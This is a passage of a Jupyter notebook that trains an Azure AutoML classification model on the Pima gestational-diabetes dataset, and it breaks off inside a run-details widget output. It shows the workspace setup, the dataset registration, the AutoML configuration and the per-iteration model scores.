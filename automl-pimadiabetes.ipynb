{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Automated ML\n",
    "\n",
    "Import Dependencies. "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {
    "gather": {
     "logged": 1612216473818
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "SDK version: 1.20.0\n"
     ]
    }
   ],
   "source": [
    "import logging\n",
    "import os\n",
    "import csv\n",
    "\n",
    "from matplotlib import pyplot as plt\n",
    "import numpy as np\n",
    "import pandas as pd\n",
    "from sklearn import datasets\n",
    "import pkg_resources\n",
    "\n",
    "import azureml.core\n",
    "from azureml.core.experiment import Experiment\n",
    "from azureml.core.workspace import Workspace\n",
    "from azureml.train.automl import AutoMLConfig\n",
    "from azureml.core.dataset import Dataset\n",
    "\n",
    "from azureml.pipeline.steps import AutoMLStep\n",
    "\n",
    "#!pip install azureml-sdk==1.19.0\n",
    "\n",
    "# Check core SDK version number\n",
    "print(\"SDK version:\", azureml.core.VERSION)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Dataset\n",
    "\n",
    "### Overview\n",
    "I will be using a diabetes dataset from datahub.io dataset on gestational diabetes. https://datahub.io/machine-learning/diabetes/r/diabetes.csv\n",
    "This dataset will aid to forecast gestational diabetes in women.\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 16,
   "metadata": {
    "collapsed": true,
    "gather": {
     "logged": 1612216672719
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "trn-aue-aa-ml\n",
      "trn-aue-advanced-analytics-ml\n",
      "australiaeast\n",
      "8a086c9c-5530-4791-89af-62c8cdfda3fd\n",
      "Found existing cluster, use it.\n",
      "Succeeded....................................\n",
      "AmlCompute wait for completion finished\n",
      "\n",
      "Wait timeout has been reached\n",
      "Current provisioning state of AmlCompute is \"Succeeded\" and current node count is \"0\"\n"
     ]
    },
    {
     "data": {
      "text/html": [
       "<div>\n",
       "<style scoped>\n",
       "    .dataframe tbody tr th:only-of-type {\n",
       "        vertical-align: middle;\n",
       "    }\n",
       "\n",
       "    .dataframe tbody tr th {\n",
       "        vertical-align: top;\n",
       "    }\n",
       "\n",
       "    .dataframe thead th {\n",
       "        text-align: right;\n",
       "    }\n",
       "</style>\n",
       "<table border=\"1\" class=\"dataframe\">\n",
       "  <thead>\n",
       "    <tr style=\"text-align: right;\">\n",
       "      <th></th>\n",
       "      <th>preg</th>\n",
       "      <th>plas</th>\n",
       "      <th>pres</th>\n",
       "      <th>skin</th>\n",
       "      <th>insu</th>\n",
       "      <th>mass</th>\n",
       "      <th>pedi</th>\n",
       "      <th>age</th>\n",
       "    </tr>\n",
       "  </thead>\n",
       "  <tbody>\n",
       "    <tr>\n",
       "      <th>count</th>\n",
       "      <td>768.000000</td>\n",
       "      <td>768.000000</td>\n",
       "      <td>768.000000</td>\n",
       "      <td>768.000000</td>\n",
       "      <td>768.000000</td>\n",
       "      <td>768.000000</td>\n",
       "      <td>768.000000</td>\n",
       "      <td>768.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>mean</th>\n",
       "      <td>3.845052</td>\n",
       "      <td>120.894531</td>\n",
       "      <td>69.105469</td>\n",
       "      <td>20.536458</td>\n",
       "      <td>79.799479</td>\n",
       "      <td>31.992578</td>\n",
       "      <td>0.471876</td>\n",
       "      <td>33.240885</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>std</th>\n",
       "      <td>3.369578</td>\n",
       "      <td>31.972618</td>\n",
       "      <td>19.355807</td>\n",
       "      <td>15.952218</td>\n",
       "      <td>115.244002</td>\n",
       "      <td>7.884160</td>\n",
       "      <td>0.331329</td>\n",
       "      <td>11.760232</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>min</th>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.078000</td>\n",
       "      <td>21.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>25%</th>\n",
       "      <td>1.000000</td>\n",
       "      <td>99.000000</td>\n",
       "      <td>62.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>0.000000</td>\n",
       "      <td>27.300000</td>\n",
       "      <td>0.243750</td>\n",
       "      <td>24.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>50%</th>\n",
       "      <td>3.000000</td>\n",
       "      <td>117.000000</td>\n",
       "      <td>72.000000</td>\n",
       "      <td>23.000000</td>\n",
       "      <td>30.500000</td>\n",
       "      <td>32.000000</td>\n",
       "      <td>0.372500</td>\n",
       "      <td>29.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>75%</th>\n",
       "      <td>6.000000</td>\n",
       "      <td>140.250000</td>\n",
       "      <td>80.000000</td>\n",
       "      <td>32.000000</td>\n",
       "      <td>127.250000</td>\n",
       "      <td>36.600000</td>\n",
       "      <td>0.626250</td>\n",
       "      <td>41.000000</td>\n",
       "    </tr>\n",
       "    <tr>\n",
       "      <th>max</th>\n",
       "      <td>17.000000</td>\n",
       "      <td>199.000000</td>\n",
       "      <td>122.000000</td>\n",
       "      <td>99.000000</td>\n",
       "      <td>846.000000</td>\n",
       "      <td>67.100000</td>\n",
       "      <td>2.420000</td>\n",
       "      <td>81.000000</td>\n",
       "    </tr>\n",
       "  </tbody>\n",
       "</table>\n",
       "</div>"
      ],
      "text/plain": [
       "             preg        plas        pres        skin        insu        mass  \\\n",
       "count  768.000000  768.000000  768.000000  768.000000  768.000000  768.000000   \n",
       "mean     3.845052  120.894531   69.105469   20.536458   79.799479   31.992578   \n",
       "std      3.369578   31.972618   19.355807   15.952218  115.244002    7.884160   \n",
       "min      0.000000    0.000000    0.000000    0.000000    0.000000    0.000000   \n",
       "25%      1.000000   99.000000   62.000000    0.000000    0.000000   27.300000   \n",
       "50%      3.000000  117.000000   72.000000   23.000000   30.500000   32.000000   \n",
       "75%      6.000000  140.250000   80.000000   32.000000  127.250000   36.600000   \n",
       "max     17.000000  199.000000  122.000000   99.000000  846.000000   67.100000   \n",
       "\n",
       "             pedi         age  \n",
       "count  768.000000  768.000000  \n",
       "mean     0.471876   33.240885  \n",
       "std      0.331329   11.760232  \n",
       "min      0.078000   21.000000  \n",
       "25%      0.243750   24.000000  \n",
       "50%      0.372500   29.000000  \n",
       "75%      0.626250   41.000000  \n",
       "max      2.420000   81.000000  "
      ]
     },
     "execution_count": 16,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "from azureml.core.compute_target import ComputeTargetException\n",
    "from azureml.core.compute import AmlCompute\n",
    "from azureml.core.compute import ComputeTarget\n",
    "\n",
    "ws = Workspace.from_config()\n",
    "print(ws.name, ws.resource_group, ws.location, ws.subscription_id, sep = '\\n')\n",
    "\n",
    "# NOTE: update the cluster name to match the existing cluster\n",
    "# Choose a name for your CPU cluster\n",
    "amlcompute_cluster_name = \"pimadiabetes\"\n",
    "\n",
    "# Verify that cluster does not exist already\n",
    "try:\n",
    "    compute_target = ComputeTarget(workspace=ws, name=amlcompute_cluster_name)\n",
    "    print('Found existing cluster, use it.')\n",
    "except ComputeTargetException:\n",
    "    compute_config = AmlCompute.provisioning_configuration(vm_size='STANDARD_DS2_V12',# for GPU, use \"STANDARD_NC6\"\n",
    "                                                           #vm_priority = 'lowpriority', # optional\n",
    "                                                           max_nodes=5)\n",
    "    compute_target = ComputeTarget.create(ws, amlcompute_cluster_name, compute_config)\n",
    "\n",
    "compute_target.wait_for_completion(show_output=True, min_node_count = 1, timeout_in_minutes = 3)\n",
    "# For a more detailed view of current AmlCompute status, use get_status().\n",
    "\n",
    "###################\n",
    "# Define Dataset\n",
    "###################\n",
    "found = False\n",
    "key = \"pimadiabetes\"\n",
    "description_text = \"Capstone Project - Forecast Diabetes\"\n",
    "\n",
    "if key in ws.datasets.keys(): \n",
    "        found = True\n",
    "        dataset = ws.datasets[key] \n",
    "\n",
    "if not found:\n",
    "        # Create AML Dataset and register it into Workspace\n",
    "        example_data = 'https://datahub.io/machine-learning/diabetes/r/diabetes.csv'\n",
    "        dataset = Dataset.Tabular.from_delimited_files(example_data)        \n",
    "        #Register Dataset in Workspace\n",
    "        dataset = dataset.register(workspace=ws,\n",
    "                                   name=key,\n",
    "                                   description=description_text)\n",
    "\n",
    "\n",
    "df = dataset.to_pandas_dataframe()\n",
    "df.describe()"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 18,
   "metadata": {
    "gather": {
     "logged": 1612217008578
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [],
   "source": [
    "# choose a name for experiment\n",
    "experiment_name = 'automlpimadiabetes'\n",
    "project_folder = './Augusto_Avila/capstone'\n",
    "\n",
    "experiment=Experiment(ws, experiment_name)"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## AutoML Configuration\n",
    "\n",
    "Choosing a classification model to predict the likelihood of gestational diabetes, the variable class will hold the forecasted value and will be using the \n",
    "AUC_weighed metric as the result of initial automl experiment execution as the primary metric"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 19,
   "metadata": {
    "gather": {
     "logged": 1612217011377
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [],
   "source": [
    "automl_settings = {\n",
    "    \"experiment_timeout_minutes\": 60,\n",
    "    \"max_concurrent_iterations\": 5,\n",
    "    \"primary_metric\" : 'AUC_weighted'\n",
    "}\n",
    "automl_config = AutoMLConfig(compute_target=compute_target,\n",
    "                             task = \"classification\",\n",
    "                             training_data=dataset,\n",
    "                             label_column_name=\"class\",   \n",
    "                             path = project_folder,\n",
    "                             enable_early_stopping= True,\n",
    "                             enable_onnx_compatible_models=True,\n",
    "                             featurization= 'auto',\n",
    "                             debug_log = \"automl_errors.log\",\n",
    "                             **automl_settings\n",
    "                            )\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "metadata": {
    "gather": {
     "logged": 1612218879357
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Running on remote.\n",
      "No run_configuration provided, running on pimadiabetes with default configuration\n",
      "Running on remote compute: pimadiabetes\n",
      "Parent Run ID: AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\n",
      "\n",
      "Current status: FeaturesGeneration. Generating features for the dataset.\n",
      "Current status: DatasetCrossValidationSplit. Generating individually featurized CV splits.\n",
      "Current status: ModelSelection. Beginning model selection.\n",
      "\n",
      "****************************************************************************************************\n",
      "DATA GUARDRAILS: \n",
      "\n",
      "TYPE:         Cross validation\n",
      "STATUS:       DONE\n",
      "DESCRIPTION:  Each iteration of the trained model was validated through cross-validation.\n",
      "              \n",
      "DETAILS:      \n",
      "+---------------------------------+\n",
      "|Number of folds                  |\n",
      "+=================================+\n",
      "|10                               |\n",
      "+---------------------------------+\n",
      "\n",
      "****************************************************************************************************\n",
      "\n",
      "TYPE:         Class balancing detection\n",
      "STATUS:       PASSED\n",
      "DESCRIPTION:  Your inputs were analyzed, and all classes are balanced in your training data.\n",
      "              Learn more about imbalanced data: https://aka.ms/AutomatedMLImbalancedData\n",
      "\n",
      "****************************************************************************************************\n",
      "\n",
      "TYPE:         Missing feature values imputation\n",
      "STATUS:       PASSED\n",
      "DESCRIPTION:  No feature missing values were detected in the training data.\n",
      "              Learn more about missing value imputation: https://aka.ms/AutomatedMLFeaturization\n",
      "\n",
      "****************************************************************************************************\n",
      "\n",
      "TYPE:         High cardinality feature detection\n",
      "STATUS:       PASSED\n",
      "DESCRIPTION:  Your inputs were analyzed, and no high cardinality features were detected.\n",
      "              Learn more about high cardinality feature handling: https://aka.ms/AutomatedMLFeaturization\n",
      "\n",
      "****************************************************************************************************\n",
      "\n",
      "****************************************************************************************************\n",
      "ITERATION: The iteration being evaluated.\n",
      "PIPELINE: A summary description of the pipeline being evaluated.\n",
      "DURATION: Time taken for the current iteration.\n",
      "METRIC: The result of computing score on the fitted pipeline.\n",
      "BEST: The best observed score thus far.\n",
      "****************************************************************************************************\n",
      "\n",
      " ITERATION   PIPELINE                                       DURATION      METRIC      BEST\n",
      "         4   MaxAbsScaler RandomForest                      0:01:52       0.8198    0.8198\n",
      "         0   MaxAbsScaler LightGBM                          0:01:56       0.7981    0.8198\n",
      "         2   MaxAbsScaler RandomForest                      0:02:14       0.8184    0.8198\n",
      "         3   MaxAbsScaler RandomForest                      0:02:19       0.8273    0.8273\n",
      "         5   MaxAbsScaler ExtremeRandomTrees                0:02:16       0.8168    0.8273\n",
      "         1   MaxAbsScaler XGBoostClassifier                 0:02:50       0.8366    0.8366\n",
      "         6   MaxAbsScaler ExtremeRandomTrees                0:01:53       0.8095    0.8366\n",
      "         7   MaxAbsScaler ExtremeRandomTrees                0:02:01       0.7975    0.8366\n",
      "         8   MaxAbsScaler RandomForest                      0:02:01       0.8032    0.8366\n",
      "         9   MaxAbsScaler ExtremeRandomTrees                0:02:01       0.7863    0.8366\n",
      "        10   MaxAbsScaler RandomForest                      0:02:11       0.8158    0.8366\n",
      "        11   MaxAbsScaler RandomForest                      0:01:53       0.8077    0.8366\n",
      "        13   StandardScalerWrapper XGBoostClassifier        0:01:59       0.8208    0.8366\n",
      "        14   MaxAbsScaler RandomForest                      0:01:56       0.8206    0.8366\n",
      "        12   MaxAbsScaler RandomForest                      0:02:13       0.7730    0.8366\n",
      "        15   StandardScalerWrapper ExtremeRandomTrees       0:02:00       0.8183    0.8366\n",
      "        16   MaxAbsScaler ExtremeRandomTrees                0:01:48       0.8147    0.8366\n",
      "        17   MaxAbsScaler ExtremeRandomTrees                0:02:04       0.8104    0.8366\n",
      "        18   MaxAbsScaler RandomForest                      0:02:05       0.8039    0.8366\n",
      "        19   MaxAbsScaler LightGBM                          0:01:59       0.8223    0.8366\n",
      "        20   MaxAbsScaler LogisticRegression                0:02:02       0.8210    0.8366\n",
      "        21   StandardScalerWrapper XGBoostClassifier        0:01:53       0.8240    0.8366\n",
      "        22   MaxAbsScaler LightGBM                          0:02:00       0.8152    0.8366\n",
      "        23   StandardScalerWrapper XGBoostClassifier        0:02:00       0.8161    0.8366\n",
      "        24   StandardScalerWrapper XGBoostClassifier        0:02:04       0.8298    0.8366\n",
      "        25   StandardScalerWrapper XGBoostClassifier        0:02:04       0.7868    0.8366\n",
      "        26   StandardScalerWrapper XGBoostClassifier        0:02:22       0.8152    0.8366\n",
      "        28   SparseNormalizer XGBoostClassifier             0:01:56       0.7223    0.8366\n",
      "        27   StandardScalerWrapper XGBoostClassifier        0:02:03       0.8133    0.8366\n",
      "        29   StandardScalerWrapper LogisticRegression       0:01:59       0.8245    0.8366\n",
      "        30   TruncatedSVDWrapper XGBoostClassifier          0:02:05       0.8043    0.8366\n",
      "        31   StandardScalerWrapper XGBoostClassifier        0:01:52       0.8127    0.8366\n",
      "        32   MaxAbsScaler ExtremeRandomTrees                0:01:55       0.8348    0.8366\n",
      "        33   SparseNormalizer XGBoostClassifier             0:02:05       0.6816    0.8366\n",
      "        34   StandardScalerWrapper LogisticRegression       0:02:00       0.8073    0.8366\n",
      "        35                                                  0:01:32          nan    0.8366\n",
      "        36   MaxAbsScaler LightGBM                          0:01:27          nan    0.8366\n",
      "        37                                                  0:00:08          nan    0.8366\n",
      "        38    VotingEnsemble                                0:03:19       0.8475    0.8475\n"
     ]
    }
   ],
   "source": [
    "## Submit Experiment\n",
    "\n",
    "from azureml.widgets import RunDetails\n",
    "from azureml.core.run import Run\n",
    "\n",
    "remote_run = experiment.submit(automl_config,show_output=True)\n"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "## Run Details\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "metadata": {
    "gather": {
     "logged": 1612176629207
    },
    "jupyter": {
     "outputs_hidden": false,
     "source_hidden": false
    },
    "nteract": {
     "transient": {
      "deleting": false
     }
    }
   },
   "outputs": [
    {
     "data": {
      "application/vnd.jupyter.widget-view+json": {
       "model_id": "589ddbba5f0a4e4d83ddc85282c8fdbf",
       "version_major": 2,
       "version_minor": 0
      },
      "text/plain": [
       "_AutoMLWidget(widget_settings={'childWidgetDisplay': 'popup', 'send_telemetry': False, 'log_level': 'INFO', 's…"
      ]
     },
     "metadata": {},
     "output_type": "display_data"
    },
    {
     "data": {
      "application/aml.mini.widget.v1": "{\"status\": \"Completed\", \"workbench_run_details_uri\": \"https://ml.azure.com/experiments/automlpimadiabetes/runs/AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea?wsid=/subscriptions/8a086c9c-5530-4791-89af-62c8cdfda3fd/resourcegroups/trn-aue-advanced-analytics-ml/workspaces/trn-aue-aa-ml\", \"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"run_properties\": {\"run_id\": \"AutoML_ee49c83d-a7f9-4a51-acc9-c8760158baea\", \"created_utc\": \"2021-02-01T22:03:42.448276Z\", \"properties\": {\"num_iterations\": \"1000\", \"training_type\": \"TrainFull\", \"acquisition_function\": \"EI\", \"primary_metric\": \"AUC_weighted\", \"train_split\": \"0\", \"acquisition_parameter\": \"0\", \"num_cross_validation\": null, \"target\": \"pimadiabetes\", \"AMLSettingsJsonString\": \"{\\\"path\\\":null,\\\"name\\\":\\\"automlpimadiabetes\\\",\\\"subscription_id\\\":\\\"8a086c9c-5530-4791-89af-62c8cdfda3fd\\\",\\\"resource_group\\\":\\\"trn-aue-advanced-analytics-ml\\\",\\\"workspace_name\\\":\\\"trn-aue-aa-ml\\\",\\\"region\\\":\\\"australiaeast\\\",\\\"compute_target\\\":\\\"pimadiabetes\\\",\\\"spark_service\\\":null,\\\"azure_service\\\":\\\"remote\\\",\\\"many_models\\\":false,\\\"pipeline_fetch_max_batch_size\\\":1,\\\"iterations\\\":1000,\\\"primary_metric\\\":\\\"AUC_weighted\\\",\\\"task_type\\\":\\\"classification\\\",\\\"data_script\\\":null,\\\"validation_size\\\":0.0,\\\"n_cross_validations\\\":null,\\\"y_min\\\":null,\\\"y_max\\\":null,\\\"num_classes\\\":null,\\\"featurization\\\":\\\"auto\\\",\\\"_ignore_package_version_incompatibilities\\\":false,\\\"is_timeseries\\\":false,\\\"max_cores_per_iteration\\\":1,\\\"max_concurrent_iterations\\\":5,\\\"iteration_timeout_minutes\\\":null,\\\"mem_in_mb\\\":null,\\\"enforce_time_on_windows\\\":false,\\\"experiment_timeout_minutes\\\":60,\\\"experiment_exit_score\\\":null,\\\"whitelist_models\\\":null,\\\"blacklist_algos\\\":[\\\"TensorFlowLinearClassifier\\\",\\\"TensorFlowDNN\\\"],\\\"supported_models\\\":[\\\"TensorFlowDNN\\\",\\\"SVM\\\",\\\"BernoulliNaiveBayes\\\",\\\"LogisticRegression\\\",\\\"MultinomialNaiveBayes\\\",\\\"KNN\\\",\\\"TensorFlowLinearClassifier\\\",\\\"SGD\\\",\\\"DecisionTree\\\",\\\"LightGBM\\\",\\\"XGBoostClassifier\\\",\\\"ExtremeRandomTrees\\\",\\\"LinearSVM\\\",\\\"GradientBoosting\\\",\\\"AveragedPerceptronClassifier\\\",\\\"RandomForest\\\"],\\\"auto_blacklist\\\":true,\\\"blacklist_samples_reached\\\":false,\\\"exclude_nan_labels\\\":true,\\\"verbosity\\\":20,\\\"_debug_log\\\":\\\"azureml_automl.log\\\",\\\"show_warnings\\\":false,\\\"model_explainability\\\":true,\\\"service_url\\\":null,\\\"sdk_url\\\":null,\\\"sdk_packages\\\":null,\\\"enable_onnx_compatible_models\\\":true,\\\"enable_split_onnx_featurizer_estimator_models\\\":false,\\\"vm_type\\\":\\\"STANDARD_DS12_V2\\\",\\\"telemetry_verbosity\\\":20,\\\"send_telemetry\\\":true,\\\"enable_dnn\\\":false,\\\"scenario\\\":\\\"SDK-1.13.0\\\",\\\"environment_label\\\":null,\\\"force_text_dnn\\\":false,\\\"enable_feature_sweeping\\\":false,\\\"enable_early_stopping\\\":true,\\\"early_stopping_n_iters\\\":10,\\\"metrics\\\":null,\\\"enable_ensembling\\\":true,\\\"enable_stack_ensembling\\\":false,\\\"ensemble_iterations\\\":15,\\\"enable_tf\\\":false,\\\"enable_subsampling\\\":null,\\\"subsample_seed\\\":null,\\\"enable_nimbusml\\\":false,\\\"enable_streaming\\\":false,\\\"force_streaming\\\":false,\\\"track_child_runs\\\":true,\\\"allowed_private_models\\\":[],\\\"label_column_name\\\":\\\"class\\\",\\\"weight_column_name\\\":null,\\\"cv_split_column_names\\\":null,\\\"enable_local_managed\\\":false,\\\"_local_managed_run_id\\\":null,\\\"cost_mode\\\":1,\\\"lag_length\\\":0,\\\"metric_operation\\\":\\\"maximize\\\",\\\"preprocess\\\":true}\", \"DataPrepJsonString\": \"{\\\\\\\"training_data\\\\\\\": \\\\\\\"{\\\\\\\\\\\\\\\"blocks\\\\\\\\\\\\\\\": [{\\\\\\\\\\\\\\\"id\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"40256732-caf5-4231-aa61-100bc802370b\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"Microsoft.DPrep.GetDatastoreFilesBlock\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"arguments\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"datastores\\\\\\\\\\\\\\\": [{\\\\\\\\\\\\\\\"datastoreName\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"workspaceblobstore\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"path\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"UI/01-26-2021_082414_UTC/diabetes_csv.csv\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"resourceGroup\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"trn-aue-advanced-analytics-ml\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"subscription\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"8a086c9c-5530-4791-89af-62c8cdfda3fd\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"workspaceName\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"trn-aue-aa-ml\\\\\\\\\\\\\\\"}]}, \\\\\\\\\\\\\\\"localData\\\\\\\\\\\\\\\": {}, \\\\\\\\\\\\\\\"isEnabled\\\\\\\\\\\\\\\": true, \\\\\\\\\\\\\\\"name\\\\\\\\\\\\\\\": null, \\\\\\\\\\\\\\\"annotation\\\\\\\\\\\\\\\": null}, {\\\\\\\\\\\\\\\"id\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"7585aae3-de77-49af-b03a-fc49e7d03f0b\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"Microsoft.DPrep.ParseDelimitedBlock\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"arguments\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"columnHeadersMode\\\\\\\\\\\\\\\": 1, \\\\\\\\\\\\\\\"fileEncoding\\\\\\\\\\\\\\\": 0, \\\\\\\\\\\\\\\"handleQuotedLineBreaks\\\\\\\\\\\\\\\": false, \\\\\\\\\\\\\\\"preview\\\\\\\\\\\\\\\": false, \\\\\\\\\\\\\\\"separator\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\",\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"skipRows\\\\\\\\\\\\\\\": 0, \\\\\\\\\\\\\\\"skipRowsMode\\\\\\\\\\\\\\\": 0}, \\\\\\\\\\\\\\\"localData\\\\\\\\\\\\\\\": {}, \\\\\\\\\\\\\\\"isEnabled\\\\\\\\\\\\\\\": true, \\\\\\\\\\\\\\\"name\\\\\\\\\\\\\\\": null, \\\\\\\\\\\\\\\"annotation\\\\\\\\\\\\\\\": null}, {\\\\\\\\\\\\\\\"id\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"2a4a8c85-06e5-473c-8e9d-66a1caae4b31\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"Microsoft.DPrep.DropColumnsBlock\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"arguments\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"columns\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 0, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumns\\\\\\\\\\\\\\\": [\\\\\\\\\\\\\\\"Path\\\\\\\\\\\\\\\"]}}}, \\\\\\\\\\\\\\\"localData\\\\\\\\\\\\\\\": {}, \\\\\\\\\\\\\\\"isEnabled\\\\\\\\\\\\\\\": true, \\\\\\\\\\\\\\\"name\\\\\\\\\\\\\\\": null, \\\\\\\\\\\\\\\"annotation\\\\\\\\\\\\\\\": null}, {\\\\\\\\\\\\\\\"id\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"648ce0d8-a8e2-4da0-9c92-19ec61f9e142\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"Microsoft.DPrep.SetColumnTypesBlock\\\\\\\\\\\\\\\", \\\\\\\\\\\\\\\"arguments\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"columnConversion\\\\\\\\\\\\\\\": [{\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"Path\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 0}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"preg\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 2}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"plas\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 2}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"pres\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 2}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"skin\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 2}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"insu\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 2}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"mass\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 3}, {\\\\\\\\\\\\\\\"column\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"type\\\\\\\\\\\\\\\": 2, \\\\\\\\\\\\\\\"details\\\\\\\\\\\\\\\": {\\\\\\\\\\\\\\\"selectedColumn\\\\\\\\\\\\\\\": \\\\\\\\\\\\\\\"pedi\\\\\\\\\\\\\\\"}}, \\\\\\\\\\\\\\\"typeProperty\\\\\\\\\\\\\\\": 3}, 